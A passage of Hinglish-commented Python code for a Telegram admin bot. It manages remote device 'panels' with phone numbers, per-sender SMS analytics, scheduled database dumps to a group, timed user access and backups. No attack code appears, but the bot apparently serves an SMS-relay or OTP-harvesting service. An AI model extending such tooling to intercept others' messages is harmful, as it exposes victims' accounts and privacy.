                try:
                    chat = await ctx.bot.get_chat(handle)
                    target = chat.id
                except Exception as e:
                    await update.message.reply_text(
                        f"❌ <code>{html_escape(handle)}</code> resolve nahi hua: "
                        f"<code>{html_escape(str(e))}</code>\n\n"
                        "Bot ko us group me <b>admin</b> banayein, phir dobara try karein.\n"
                        "Ya numeric ID bhejein (e.g. <code>-1001234567890</code>).",
                        parse_mode="HTML")
                    return True
            else:
                try:
                    target = int(raw)
                except ValueError:
                    target = None
        if not target:
            await update.message.reply_text("❌ Valid group ID / @username / forward bhejein.")
            return True
        AUTO_DB_GROUP = target
        save_data()

        # 🔎 Turant verify: bot us chat me hai? post kar sakta hai?
        ok, real_id, err = await resolve_send_chat(ctx.bot, target)
        if ok:
            warn = ""
            try:
                chat = await ctx.bot.get_chat(real_id)
                if chat.type == "channel":
                    me = await ctx.bot.get_me()
                    mem = await ctx.bot.get_chat_member(real_id, me.id)
                    if not getattr(mem, "can_post_messages", True):
                        warn = ("\n\n⚠️ Bot channel me admin hai lekin "
                                "<b>Post Messages</b> right nahi hai.\n"
                                "Channel → Administrators → bot → Post Messages ON karein.")
            except Exception:
                pass
            await update.message.reply_text(
                f"🎯 <b>Target Group Set</b>\n<code>{real_id}</code>\n"
                f"✅ Bot wahan pahunch sakta hai.\n\n"
                f"Ab Auto DB Sender ON karein (har {AUTO_DB_INTERVAL}s)." + warn,
                parse_mode="HTML",
                reply_markup=adm_autodb_keyboard(),
            )
        else:
            await update.message.reply_text(
                f"⚠️ <b>ID save ho gayi, lekin bot wahan nahi pahunch sakta</b>\n"
                f"<code>{target}</code>\n\n"
                f"❌ <code>{html_escape(err[:200])}</code>\n\n"
                "🔧 <b>Private channel ke liye:</b>\n"
                "1. Channel → Administrators → <b>Add Admin</b>\n"
                "2. Bot ka username daalo: <code>@QxP_Pannel_bot</code>\n"
                "3. <b>Post Messages</b> right ON karo\n"
                "4. Phir channel ka koi message yahan <b>forward</b> karo\n\n"
                "💡 Ya <b>📍 Set This Chat</b> dabao (group ke andar se).",
                parse_mode="HTML",
                reply_markup=adm_autodb_keyboard(),
            )
        return True

    return False


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel any pending input action."""
    chat_id = update.effective_chat.id
    had = pending_action.pop(chat_id, None)
    pending_kw_confirm.pop(chat_id, None)
    if had:
        await update.message.reply_text(
            f"{premium_emoji()} <b>Cancelled</b>\n\nAction <code>{html_escape(str(had.get('action', '')))}</code> cancel ho gaya.",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            f"{premium_emoji()} <b>Kuch pending nahi tha.</b>", parse_mode="HTML"
        )


async def cmd_setgroup(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: /setgroup <chat_id|@username>  — set auto-DB target group."""
    global AUTO_DB_GROUP
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only.")
        return
    if not ctx.args:
        await update.message.reply_text(
            f"Usage: <code>/setgroup -1001234567890</code>\n"
            f"Current: <code>{AUTO_DB_GROUP or 'Not set'}</code>",
            parse_mode="HTML"
        )
        return
    raw = ctx.args[0].strip()
    try:
        target = int(raw)
    except ValueError:
        try:
            chat = await ctx.bot.get_chat(raw)
            target = chat.id
        except Exception as e:
            await update.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
            return
    AUTO_DB_GROUP = target
    save_data()
    await update.message.reply_text(
        f"🎯 Target group set: <code>{target}</code>\n"
        f"Auto DB: {'ON' if AUTO_DB_ENABLED else 'OFF'} · Interval: {AUTO_DB_INTERVAL}s\n"
        f"ON karne ke liye: /autodb on",
        parse_mode="HTML"
    )


async def cmd_autodb(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin: /autodb [on|off|now|interval <sec>]"""
    global AUTO_DB_ENABLED, AUTO_DB_INTERVAL, AUTO_DB_LAST_SENT, AUTO_DB_SENT_COUNT
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only.")
        return
    arg = (ctx.args[0].lower() if ctx.args else "").strip()

    if arg == "on":
        if not AUTO_DB_GROUP:
            await update.message.reply_text("⚠️ Pehle /setgroup se group set karein.")
            return
        AUTO_DB_ENABLED = True
        save_data()
        await update.message.reply_text(f"🟢 Auto DB ON — every {AUTO_DB_INTERVAL}s → {AUTO_DB_GROUP}")
        return
    if arg == "off":
        AUTO_DB_ENABLED = False
        save_data()
        await update.message.reply_text("🔴 Auto DB OFF")
        return
    if arg == "now":
        if not AUTO_DB_GROUP:
            await update.message.reply_text("⚠️ Pehle /setgroup se group set karein.")
            return
        try:
            await ctx.bot.send_document(
                chat_id=AUTO_DB_GROUP,
                document=_db_snapshot_bytes(),
                filename=f"database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                caption="🗄 <b>MANUAL DATABASE</b>",
                parse_mode="HTML",
            )
            AUTO_DB_LAST_SENT = time.time()
            AUTO_DB_SENT_COUNT += 1
            await update.message.reply_text("✅ Sent.")
        except Exception as e:
            await update.message.reply_text(f"❌ {html_escape(str(e))}", parse_mode="HTML")
        return
    if arg == "interval" and len(ctx.args) > 1:
        try:
            AUTO_DB_INTERVAL = max(10, int(ctx.args[1]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number.")
            return
        save_data()
        await update.message.reply_text(f"⏱ Interval = {AUTO_DB_INTERVAL}s")
        return

    await update.message.reply_text(adm_autodb_text(), reply_markup=adm_autodb_keyboard(),
                                    parse_mode="HTML")


async def on_error(update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — har error log karo aur user ko batao.
    Isse koi bhi button/input kabhi 'chup-chaap' fail nahi hoga."""
    import traceback as _tb
    err = ctx.error
    if isinstance(err, Conflict) or "terminated by other getUpdates" in str(err):
        tlog("⛔ CONFLICT: Bot ka koi AUR instance bhi chal raha hai! "
             "Ek hi instance chalao — warna button-click aur text-reply alag-alag "
             "instances par chale jaate hain aur pending inputs 'Unknown command' ho jaate hain.")
        return
    _log(f"GLOBAL ERROR: {type(err).__name__}: {err}")
    _tb.print_exception(type(err), err, err.__traceback__)
    try:
        if isinstance(update, Update) and update.effective_chat is not None:
            await ctx.bot.send_message(
                update.effective_chat.id,
                f"⚠️ <b>Error</b>\n<code>{html_escape(str(err))[:300]}</code>\n\n"
                f"Dobara try karein — /start",
                parse_mode="HTML",
            )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
#  ADVANCED OPS SUITE — duplicates, health, heatmap, uptime,
#  live dashboard, access expiry, multi-format backup, analytics
# ═══════════════════════════════════════════════════════════════

def _norm_num(n: str) -> str:
    digits = re.sub(r"\D", "", str(n or ""))
    if len(digits) > 10:
        digits = digits[-10:]
    return digits


def rebuild_number_index() -> dict:
    """Scan GLOBAL_DEVICE_CACHE and build number -> device occurrences."""
    global NUMBER_INDEX
    idx: dict = {}
    for tag, devices in GLOBAL_DEVICE_CACHE.items():
        for d in devices or []:
            for raw in (d.numbers or []):
                nn = _norm_num(raw)
                if len(nn) < 8:
                    continue
                idx.setdefault(nn, []).append({
                    "panel": tag,
                    "device_id": d.id,
                    "name": d.name,
                    "status": d.status,
                    "number": raw,
                })
    NUMBER_INDEX = idx
    return idx


def find_duplicate_numbers(min_hits: int = 2) -> list:
    idx = NUMBER_INDEX or rebuild_number_index()
    dups = []
    for num, hits in idx.items():
        panels = {h["panel"] for h in hits}
        if len(hits) >= min_hits or len(panels) >= 2:
            dups.append((num, hits))
    dups.sort(key=lambda x: (-len(x[1]), x[0]))
    return dups


def record_sms_volume(n: int = 1) -> None:
    day = datetime.now().strftime("%Y-%m-%d")
    SMS_VOLUME[day] = int(SMS_VOLUME.get(day, 0) or 0) + int(n)


def record_sender_stat(sender: str, panel: str = "") -> None:
    key = (sender or "unknown").strip()[:80] or "unknown"
    st = SENDER_STATS.setdefault(key, {"count": 0, "last_ts": 0, "last_panel": ""})
    st["count"] = int(st.get("count", 0) or 0) + 1
    st["last_ts"] = int(time.time())
    if panel:
        st["last_panel"] = panel


def record_panel_health(tag: str, ok: bool, latency_ms: int = 0) -> None:
    st = PANEL_HEALTH.setdefault(tag, {
        "ok": 0, "fail": 0, "last_latency_ms": 0, "last_ok_ts": 0, "last_fail_ts": 0,
    })
    if ok:
        st["ok"] = int(st.get("ok", 0) or 0) + 1
        st["last_ok_ts"] = int(time.time())
        st["last_latency_ms"] = int(latency_ms)
    else:
        st["fail"] = int(st.get("fail", 0) or 0) + 1
        st["last_fail_ts"] = int(time.time())


def panel_health_score(tag: str) -> int:
    """0-100 score from success ratio + freshness + device online ratio."""
    st = PANEL_HEALTH.get(tag) or {}
    ok = int(st.get("ok", 0) or 0)
    fail = int(st.get("fail", 0) or 0)
    total = ok + fail
    ratio = (ok / total) if total else 0.5
    devices = GLOBAL_DEVICE_CACHE.get(tag) or []
    online = sum(1 for d in devices if getattr(d, "status", "") == "online")
    online_ratio = (online / len(devices)) if devices else 0.0
    last_ok = int(st.get("last_ok_ts", 0) or 0)
    age = time.time() - last_ok if last_ok else 99999
    freshness = 1.0 if age < 120 else (0.7 if age < 600 else (0.4 if age < 3600 else 0.1))
    score = int(round(100 * (0.45 * ratio + 0.35 * online_ratio + 0.20 * freshness)))
    return max(0, min(100, score))


def track_device_uptime_snapshot() -> None:
    """Update DEVICE_UPTIME from current cache (call from poll loop)."""
    now = int(time.time())
    for tag, devices in GLOBAL_DEVICE_CACHE.items():
        for d in devices or []:
            key = f"{tag}:{d.id}"
            st = DEVICE_UPTIME.setdefault(key, {
                "panel": tag, "device_id": d.id, "name": d.name,
                "first_seen": now, "last_online": 0, "last_offline": 0,
                "online_sec": 0, "samples": 0, "last_status": "",
            })
            st["samples"] = int(st.get("samples", 0) or 0) + 1
            st["name"] = d.name
            prev = st.get("last_status") or ""
            cur = d.status or "offline"
            if cur == "online":
                st["last_online"] = now
                # approximate interval contribution
                st["online_sec"] = int(st.get("online_sec", 0) or 0) + max(1, int(POLL_INTERVAL))
            else:
                st["last_offline"] = now
            st["last_status"] = cur


def live_online_dashboard_text() -> str:
    rebuild_number_index()
    total_dev = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
    online = sum(1 for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.status == "online")
    offline = total_dev - online
    nums = sum(len(d.numbers) for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.numbers)
    dups = find_duplicate_numbers()
    today = datetime.now().strftime("%Y-%m-%d")
    vol_today = int(SMS_VOLUME.get(today, 0) or 0)
    lines = [
        f"{premium_emoji()} <b>LIVE DASHBOARD</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"📡 Panels        : <b>{len(DATABASES)}</b>",
        f"📱 Devices       : <b>{total_dev}</b>",
        f"🟢 Online        : <b>{online}</b>",
        f"🔴 Offline       : <b>{offline}</b>",
        f"🔢 Numbers       : <b>{nums}</b>",
        f"🔁 Duplicate nums: <b>{len(dups)}</b>",
        f"📩 SMS today     : <b>{vol_today}</b>",
        f"👥 Users         : <b>{len(all_users)}</b>",
        f"✅ Allowed       : <b>{len(allowed_users)}</b>",
        "━━━━━━━━━━━━━━━━━━",
        "<b>Top panels by online</b>",
    ]
    scored = []
    for tag in DATABASES:
        devs = GLOBAL_DEVICE_CACHE.get(tag, [])
        on = sum(1 for d in devs if d.status == "online")
        scored.append((on, len(devs), panel_health_score(tag), tag))
    scored.sort(reverse=True)
    for on, tot, hs, tag in scored[:12]:
        bar = "█" * (hs // 10) + "░" * (10 - hs // 10)
        lines.append(f"• <b>{html_escape(tag)}</b> 🟢{on}/{tot}  score <code>{hs}</code> {bar}")
    return "\n".join(lines)


def duplicate_numbers_text(limit: int = 30) -> str:
    dups = find_duplicate_numbers()
    lines = [
        f"{premium_emoji()} <b>DUPLICATE NUMBER DETECTION</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Found: <b>{len(dups)}</b> numbers on multiple devices/panels",
        "",
    ]
    if not dups:
        lines.append("<i>No duplicates right now.</i>")
        return "\n".join(lines)
    for num, hits in dups[:limit]:
        panels = sorted({h["panel"] for h in hits})
        lines.append(
            f"• <code>{html_escape(num)}</code> — {len(hits)} hits / {len(panels)} panels"
        )
        for h in hits[:4]:
            lines.append(
                f"   └ {html_escape(h['panel'])} · {html_escape(str(h.get('name','')))} · {h.get('status')}"
            )
    if len(dups) > limit:
        lines.append(f"\n… +{len(dups)-limit} more")
    return "\n".join(lines)


def panel_health_text() -> str:
    lines = [
        f"{premium_emoji()} <b>PANEL HEALTH SCORES</b>",
        "━━━━━━━━━━━━━━━━━━",
        "<i>Score = success ratio + online devices + freshness</i>",
        "",
    ]
    rows = []
    for tag in DATABASES:
        rows.append((panel_health_score(tag), tag))
    rows.sort(reverse=True)
    for hs, tag in rows[:40]:
        st = PANEL_HEALTH.get(tag) or {}
        ok = int(st.get("ok", 0) or 0)
        fail = int(st.get("fail", 0) or 0)
        lat = int(st.get("last_latency_ms", 0) or 0)
        bar = "█" * (hs // 10) + "░" * (10 - hs // 10)
        lines.append(
            f"<b>{html_escape(tag)}</b>\n"
            f"   {bar} <code>{hs}/100</code> · ok {ok} · fail {fail} · {lat}ms"
        )
    return "\n".join(lines)


def sms_heatmap_text(days: int = 14) -> str:
    lines = [
        f"{premium_emoji()} <b>SMS VOLUME HEATMAP</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Last {days} days (local time)",
        "",
    ]
    vals = []
    for i in range(days - 1, -1, -1):
        day = (datetime.now() - timedelta(days=i)).strftime("%Y-%m-%d")
        c = int(SMS_VOLUME.get(day, 0) or 0)
        vals.append((day, c))
    peak = max((c for _, c in vals), default=1) or 1
    for day, c in vals:
        width = int(round(20 * (c / peak))) if peak else 0
        bar = "█" * width + "░" * (20 - width)
        lines.append(f"<code>{day}</code> {bar} <b>{c}</b>")
    lines.append("")
    lines.append(f"Total window: <b>{sum(c for _, c in vals)}</b>")
    return "\n".join(lines)


def device_uptime_text(limit: int = 25) -> str:
    rows = sorted(
        DEVICE_UPTIME.values(),
        key=lambda s: int(s.get("online_sec", 0) or 0),
        reverse=True,
    )
    lines = [
        f"{premium_emoji()} <b>DEVICE UPTIME TRACKER</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Tracked devices: <b>{len(rows)}</b>",
        "",
    ]
    if not rows:
        lines.append("<i>No uptime samples yet — wait for poll cycles.</i>")
        return "\n".join(lines)
    for st in rows[:limit]:
        sec = int(st.get("online_sec", 0) or 0)
        lines.append(
            f"• <b>{html_escape(str(st.get('name','?')))}</b> "
            f"[{html_escape(str(st.get('panel','')))}]\n"
            f"   online≈ <code>{_fmt_uptime(sec)}</code> · last status <code>{html_escape(str(st.get('last_status','')))}</code>"
        )
    return "\n".join(lines)


def sender_analytics_text(limit: int = 30) -> str:
    rows = sorted(
        SENDER_STATS.items(),
        key=lambda kv: int((kv[1] or {}).get("count", 0) or 0),
        reverse=True,
    )
    lines = [
        f"{premium_emoji()} <b>SERVICE / SENDER ANALYTICS</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Unique senders: <b>{len(rows)}</b>",
        "",
    ]
    if not rows:
        lines.append("<i>No sender samples yet.</i>")
        return "\n".join(lines)
    for sender, st in rows[:limit]:
        ts = int(st.get("last_ts", 0) or 0)
        when = datetime.fromtimestamp(ts).strftime("%d %b %I:%M %p") if ts else "—"
        lines.append(
            f"• <code>{html_escape(sender)}</code> — <b>{int(st.get('count',0) or 0)}</b>"
            f" · last {when} · {html_escape(str(st.get('last_panel','')))}"
        )
    return "\n".join(lines)


def access_expiry_text() -> str:
    lines = [
        f"{premium_emoji()} <b>PER-USER ACCESS EXPIRY</b>",
        "━━━━━━━━━━━━━━━━━━",
        "Format grant: <code>USER_ID | days</code> (0 = never expires)",
        "",
    ]
    rows = []
    for uid in sorted(allowed_users):
        u = all_users.get(uid, {})
        exp = int(u.get("access_expires_at", 0) or 0)
        rows.append((exp or 10**12, uid, u))
    rows.sort()
    if not rows:
        lines.append("<i>No allowed users.</i>")
        return "\n".join(lines)
    now = int(time.time())
    for _, uid, u in rows[:40]:
        exp = int(u.get("access_expires_at", 0) or 0)
        if not exp:
            exp_s = "never"
        else:
            left = exp - now
            exp_s = ("EXPIRED" if left <= 0 else _fmt_uptime(left)) + f" · until {datetime.fromtimestamp(exp).strftime('%d %b %Y %I:%M %p')}"
        lines.append(
            f"• {html_escape(str(u.get('name','Unknown')))} <code>{uid}</code> — {exp_s}"
        )
    return "\n".join(lines)


def ops_suite_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("📡 Live Online Dashboard", callback_data="ops_live", style="success")],
        [premium_button("🔁 Duplicate Numbers", callback_data="ops_dups", style="primary"),
         premium_button("❤️ Panel Health", callback_data="ops_health", style="primary")],
        [premium_button("🌡 SMS Heatmap", callback_data="ops_heat", style="primary"),
         premium_button("⏱ Device Uptime", callback_data="ops_uptime", style="primary")],
        [premium_button("📨 Sender Analytics", callback_data="ops_sender", style="primary"),
         premium_button("⏳ Access Expiry", callback_data="ops_expiry", style="primary")],
        [premium_button("💾 Backup / Restore", callback_data="ops_backup", style="success")],
        [premium_button("⬅️ Admin", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def backup_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("Export JSON", callback_data="ops_exp_json", style="primary"),
         premium_button("Export SQLite", callback_data="ops_exp_sqlite", style="primary")],
        [premium_button("Export Mongo dump", callback_data="ops_exp_mongo", style="primary"),
         premium_button("Export CSV users", callback_data="ops_exp_csv", style="primary")],
        [premium_button("Import JSON", callback_data="ops_imp_json", style="success"),
         premium_button("Import SQLite", callback_data="ops_imp_sqlite", style="success")],
        [premium_button("Import Mongo JSON", callback_data="ops_imp_mongo", style="success")],
        [premium_button("⬅️ Ops Suite", callback_data="ops_suite", style="primary")],
    ])


def _snapshot_payload() -> dict:
    return {
        "format": "shown_panel_backup_v2",
        "generated_at": datetime.now().isoformat(),
        "DATABASES": DATABASES,
        "all_users": {str(k): v for k, v in all_users.items()},
        "allowed_users": list(allowed_users),
        "admin_only_tags": list(ADMIN_ONLY_TAGS),
        "force_join_enabled": FORCE_JOIN_ENABLED,
        "force_join_channels": FORCE_JOIN_CHANNELS,
        "referral_enabled": REFERRAL_ENABLED,
        "required_referrals": REQUIRED_REFERRALS,
        "grant_access_required": GRANT_ACCESS_REQUIRED,
        "auto_db_group": AUTO_DB_GROUP,
        "auto_db_backup_group": AUTO_DB_BACKUP_GROUP,
        "auto_db_enabled": AUTO_DB_ENABLED,
        "auto_db_interval": AUTO_DB_INTERVAL,
        "maintenance_mode": MAINTENANCE_MODE,
        "log_channel_id": LOG_CHANNEL_ID,
        "sms_volume": SMS_VOLUME,
        "device_uptime": DEVICE_UPTIME,
        "panel_health": PANEL_HEALTH,
        "sender_stats": SENDER_STATS,
    }


def export_backup_json_bytes() -> bytes:
    return json.dumps(_snapshot_payload(), indent=2, ensure_ascii=False, default=str).encode("utf-8")


def export_backup_sqlite_bytes() -> bytes:
    import sqlite3
    import tempfile
    os.makedirs(ANALYTICS_DIR, exist_ok=True)
    fd, tmp = tempfile.mkstemp(suffix=".sqlite3")
    os.close(fd)
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("CREATE TABLE meta (k TEXT PRIMARY KEY, v TEXT)")
        cur.execute("CREATE TABLE users (uid INTEGER PRIMARY KEY, data TEXT)")
        cur.execute("CREATE TABLE panels (tag TEXT PRIMARY KEY, url TEXT)")
        cur.execute("CREATE TABLE allowed (uid INTEGER PRIMARY KEY)")
        cur.execute("CREATE TABLE sms_volume (day TEXT PRIMARY KEY, count INTEGER)")
        cur.execute("CREATE TABLE sender_stats (sender TEXT PRIMARY KEY, data TEXT)")
        cur.execute("INSERT INTO meta(k,v) VALUES(?,?)", ("payload", json.dumps(_snapshot_payload(), default=str)))
        for uid, u in all_users.items():
            cur.execute("INSERT OR REPLACE INTO users(uid,data) VALUES(?,?)", (int(uid), json.dumps(u, default=str)))
        for tag, url in DATABASES.items():
            cur.execute("INSERT OR REPLACE INTO panels(tag,url) VALUES(?,?)", (tag, url))
        for uid in allowed_users:
            cur.execute("INSERT OR REPLACE INTO allowed(uid) VALUES(?)", (int(uid),))
        for day, c in SMS_VOLUME.items():
            cur.execute("INSERT OR REPLACE INTO sms_volume(day,count) VALUES(?,?)", (day, int(c)))
        for sender, st in SENDER_STATS.items():
            cur.execute("INSERT OR REPLACE INTO sender_stats(sender,data) VALUES(?,?)", (sender, json.dumps(st)))
        conn.commit()
        conn.close()
        with open(tmp, "rb") as f:
            return f.read()
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


def export_backup_mongo_bytes() -> bytes:
    """Mongo-style JSON lines dump (mongodump-compatible collection docs)."""
    payload = _snapshot_payload()
    docs = [
        {"_id": "meta", **{k: v for k, v in payload.items() if k not in ("all_users", "DATABASES")}},
        {"_id": "databases", "items": payload["DATABASES"]},
        {"_id": "users", "items": payload["all_users"]},
        {"_id": "analytics", "sms_volume": SMS_VOLUME, "sender_stats": SENDER_STATS,
         "panel_health": PANEL_HEALTH, "device_uptime": DEVICE_UPTIME},
    ]
    return ("\n".join(json.dumps(d, ensure_ascii=False, default=str) for d in docs) + "\n").encode("utf-8")


def apply_backup_payload(payload: dict, merge_panels: bool = True) -> str:
    global DATABASES, allowed_users, ADMIN_ONLY_TAGS
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, REFERRAL_ENABLED, REQUIRED_REFERRALS
    global GRANT_ACCESS_REQUIRED, AUTO_DB_GROUP, AUTO_DB_BACKUP_GROUP, AUTO_DB_ENABLED
    global AUTO_DB_INTERVAL, MAINTENANCE_MODE, LOG_CHANNEL_ID
    global SMS_VOLUME, DEVICE_UPTIME, PANEL_HEALTH, SENDER_STATS, all_users

    if not isinstance(payload, dict):
        return "Invalid payload"

    users = payload.get("all_users") or payload.get("users") or {}
    for k, v in users.items():
        try:
            all_users[int(k)] = v
        except Exception:
            continue

    dbs = payload.get("DATABASES") or payload.get("databases") or {}
    if isinstance(dbs, dict) and dbs:
        if merge_panels:
            DATABASES.update({str(k): str(v) for k, v in dbs.items()})
        else:
            DATABASES = {str(k): str(v) for k, v in dbs.items()}

    if "allowed_users" in payload:
        allowed_users = set(int(x) for x in payload.get("allowed_users") or [])
    if "admin_only_tags" in payload:
        ADMIN_ONLY_TAGS = set(payload.get("admin_only_tags") or [])
    FORCE_JOIN_ENABLED = bool(payload.get("force_join_enabled", FORCE_JOIN_ENABLED))
    if isinstance(payload.get("force_join_channels"), list):
        FORCE_JOIN_CHANNELS = payload.get("force_join_channels") or []
    REFERRAL_ENABLED = bool(payload.get("referral_enabled", REFERRAL_ENABLED))
    try:
        REQUIRED_REFERRALS = int(payload.get("required_referrals", REQUIRED_REFERRALS))
    except Exception:
        pass
    GRANT_ACCESS_REQUIRED = bool(payload.get("grant_access_required", GRANT_ACCESS_REQUIRED))
    try:
        AUTO_DB_GROUP = int(payload.get("auto_db_group", AUTO_DB_GROUP) or 0)
        AUTO_DB_BACKUP_GROUP = int(payload.get("auto_db_backup_group", AUTO_DB_BACKUP_GROUP) or 0)
        AUTO_DB_INTERVAL = int(payload.get("auto_db_interval", AUTO_DB_INTERVAL) or 30)
        LOG_CHANNEL_ID = int(payload.get("log_channel_id", LOG_CHANNEL_ID) or 0)
    except Exception:
        pass
    AUTO_DB_ENABLED = bool(payload.get("auto_db_enabled", AUTO_DB_ENABLED))
    MAINTENANCE_MODE = bool(payload.get("maintenance_mode", MAINTENANCE_MODE))
    SMS_VOLUME = payload.get("sms_volume") or SMS_VOLUME
    DEVICE_UPTIME = payload.get("device_uptime") or DEVICE_UPTIME
    PANEL_HEALTH = payload.get("panel_health") or PANEL_HEALTH
    SENDER_STATS = payload.get("sender_stats") or SENDER_STATS
    save_data()
    return (
        f"Restored users={len(all_users)} panels={len(DATABASES)} "
        f"allowed={len(allowed_users)}"
    )


def import_backup_json_bytes(raw: bytes) -> str:
    payload = json.loads(raw.decode("utf-8-sig"))
    if isinstance(payload, list):
        # mongo json lines merged
        merged = {}
        for doc in payload:
            if not isinstance(doc, dict):
                continue
            if doc.get("_id") == "databases":
                merged["DATABASES"] = doc.get("items") or {}
            elif doc.get("_id") == "users":
                merged["all_users"] = doc.get("items") or {}
            elif doc.get("_id") == "analytics":
                merged.update({k: doc.get(k) for k in ("sms_volume", "sender_stats", "panel_health", "device_uptime")})
            else:
                merged.update({k: v for k, v in doc.items() if k != "_id"})
        payload = merged
    return apply_backup_payload(payload)


def import_backup_sqlite_bytes(raw: bytes) -> str:
    import sqlite3
    import tempfile
    fd, tmp = tempfile.mkstemp(suffix=".sqlite3")
    os.close(fd)
    try:
        with open(tmp, "wb") as f:
            f.write(raw)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        try:
            cur.execute("SELECT v FROM meta WHERE k='payload'")
            row = cur.fetchone()
            if row:
                return apply_backup_payload(json.loads(row[0]))
        except Exception:
            pass
        # fallback tables
        payload = {"all_users": {}, "DATABASES": {}, "allowed_users": [], "sms_volume": {}, "sender_stats": {}}
        try:
            for uid, data in cur.execute("SELECT uid, data FROM users"):
                payload["all_users"][str(uid)] = json.loads(data)
        except Exception:
            pass
        try:
            for tag, url in cur.execute("SELECT tag, url FROM panels"):
                payload["DATABASES"][tag] = url
        except Exception:
            pass
        try:
            payload["allowed_users"] = [r[0] for r in cur.execute("SELECT uid FROM allowed")]
        except Exception:
            pass
        conn.close()
        return apply_backup_payload(payload)
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


def import_backup_mongo_bytes(raw: bytes) -> str:
    docs = []
    for line in raw.decode("utf-8-sig", errors="ignore").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            docs.append(json.loads(line))
        except Exception:
            continue
    if not docs:
        # maybe a single json array
        return import_backup_json_bytes(raw)
    return import_backup_json_bytes(json.dumps(docs).encode("utf-8"))


async def ops_callbacks(update, ctx, data: str, chat_id: int, is_admin: bool) -> bool:
    if not is_admin:
        return False
    query = update.callback_query

    if data == "ops_suite":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>OPS SUITE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Duplicate detection · health · heatmap · uptime · live dashboard ·\n"
            "access expiry · multi-format backup · sender analytics",
            reply_markup=ops_suite_keyboard(),
        )
        return True

    if data == "ops_live":
        await query.answer("Refreshing…")
        await safe_edit(query, live_online_dashboard_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_dups":
        await query.answer()
        await safe_edit(query, duplicate_numbers_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_health":
        await query.answer()
        await safe_edit(query, panel_health_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_heat":
        await query.answer()
        await safe_edit(query, sms_heatmap_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_uptime":
        await query.answer()
        await safe_edit(query, device_uptime_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_sender":
        await query.answer()
        await safe_edit(query, sender_analytics_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_expiry":
        await query.answer()
        await safe_edit(query, access_expiry_text(), reply_markup=ops_suite_keyboard())
        return True

    if data == "ops_backup":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>BACKUP / RESTORE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Export/import: <b>JSON</b>, <b>SQLite</b>, <b>Mongo JSONL</b>, CSV users.\n"
            "Import: use the button then send the file.",
            reply_markup=backup_menu_keyboard(),
        )
        return True

    if data == "ops_exp_json":
        await query.answer("Exporting JSON…")
        from telegram import InputFile
        bio = export_backup_json_bytes()
        await ctx.bot.send_document(
            chat_id,
            document=InputFile(bio, filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"),
            caption="💾 JSON backup",
        )
        return True

    if data == "ops_exp_sqlite":
        await query.answer("Exporting SQLite…")
        from telegram import InputFile
        bio = export_backup_sqlite_bytes()
        await ctx.bot.send_document(
            chat_id,
            document=InputFile(bio, filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sqlite3"),
            caption="💾 SQLite backup",
        )
        return True

    if data == "ops_exp_mongo":
        await query.answer("Exporting Mongo dump…")
        from telegram import InputFile
        bio = export_backup_mongo_bytes()
        await ctx.bot.send_document(
            chat_id,
            document=InputFile(bio, filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mongo.jsonl"),
            caption="💾 Mongo-style JSONL backup",
        )
        return True

    if data == "ops_exp_csv":
        await query.answer("Exporting CSV…")
        from telegram import InputFile
        await ctx.bot.send_document(
            chat_id,
            document=InputFile(_users_csv_bytes(), filename=f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"),
            caption="📑 Users CSV",
        )
        return True

    if data in ("ops_imp_json", "ops_imp_sqlite", "ops_imp_mongo"):
        pending_action[chat_id] = {"action": data}
        await query.answer()
        kind = data.split("_")[-1]
        await query.message.reply_text(
            f"📥 <b>IMPORT {kind.upper()}</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Ab backup file bhejein (.json / .sqlite3 / .jsonl).",
            parse_mode="HTML",
        )
        return True

    return False



async def access_expiry_watch_loop(app) -> None:
    """DM users ~24h before access ends, and on expiry. Log to private channel."""
    await asyncio.sleep(8)
    while True:
        try:
            now = int(time.time())
            # warn window: 24h ahead
            for uid in list(allowed_users):
                u = all_users.get(uid) or {}
                exp = int(u.get("access_expires_at", 0) or 0)
                if not exp:
                    continue
